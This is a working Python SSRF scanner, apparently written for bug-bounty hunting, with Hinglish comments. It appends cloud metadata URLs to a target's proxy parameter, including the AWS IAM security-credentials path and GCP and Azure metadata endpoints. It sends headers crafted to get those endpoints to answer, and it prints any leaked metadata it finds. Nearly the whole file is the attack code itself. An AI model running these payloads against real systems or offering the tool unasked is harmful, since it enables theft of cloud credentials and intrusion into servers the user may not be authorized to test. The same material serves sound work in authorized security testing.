import requests
import sys

def ssrf_cloud_scan(target_endpoint):
    print(f"\n[*] Bhai, starting Cloud SSRF (Server-Side Request Forgery) Scan on: {target_endpoint}")
    print("[*] Hunting for Internal Cloud Metadata Leaks (AWS, GCP, Azure)...\n")
    print("--------------------------------------------------")

    # The Hacker's Cloud Metadata Payloads
    # Yeh endpoints sirf internal server se hi access hote hain. Agar bahar se ho gaye, matlab SSRF bug hai!
    payloads = {
        "AWS / DigitalOcean Base": "http://169.254.169.254/latest/meta-data/",
        "AWS IAM Secret Keys": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "GCP (Google Cloud)": "http://metadata.google.internal/computeMetadata/v1/",
        "Azure Metadata": "http://169.254.169.254/metadata/instance?api-version=2017-08-01",
        "Localhost (Port 22 SSH Test)": "http://127.0.0.1:22"
    }

    # Headers specially crafted to bypass weak SSRF filters and query GCP/Azure APIs
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Arch Linux x86_64)',
        'Metadata-Flavor': 'Google', # Required for GCP exploitation
        'Metadata': 'true'           # Required for Azure exploitation
    }

    vulnerabilities = 0

    for cloud_provider, payload in payloads.items():
        # Target URL ke aage humara internal payload jud jayega
        test_url = f"{target_endpoint}{payload}"
        print(f"[*] Firing {cloud_provider} Payload: {payload}")
        
        try:
            # Timeout kam rakha hai kyunki internal requests fast hoti hain
            response = requests.get(test_url, headers=headers, timeout=5)
            
            # Hacker Logic: Response ke andar specific cloud keywords dhoondho
            if response.status_code == 200 and any(keyword in response.text for keyword in ["ami-id", "instance-id", "computeMetadata", "SSH-2.0"]):
                print(f"\n   [!!!] JACKPOT 🎯 CRITICAL SSRF VULNERABILITY FOUND!")
                print(f"   [!!!] The server leaked its internal {cloud_provider} data.")
                print(f"   [!!!] Leaked Data Snippet: {response.text[:150].strip()}...\n")
                vulnerabilities += 1
            else:
                print("   [-] Safe or blocked by firewall.\n")

        except requests.exceptions.RequestException:
             print("   [-] Connection timeout or invalid routing. Moving on...\n")

    print("--------------------------------------------------")
    if vulnerabilities > 0:
        print(f"[+] SSRF Scan Complete! Found {vulnerabilities} Critical Cloud Leaks. Time to claim that Bounty! 💸")
    else:
        print("[-] SSRF Scan Complete. Target appears secure against basic unauthenticated SSRF.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 ssrf_hunter.py <url_with_parameter>")
        print("Example: python3 ssrf_hunter.py 'http://target.com/proxy?url='")
        sys.exit(1)
        
    target = sys.argv[1]
    ssrf_cloud_scan(target)
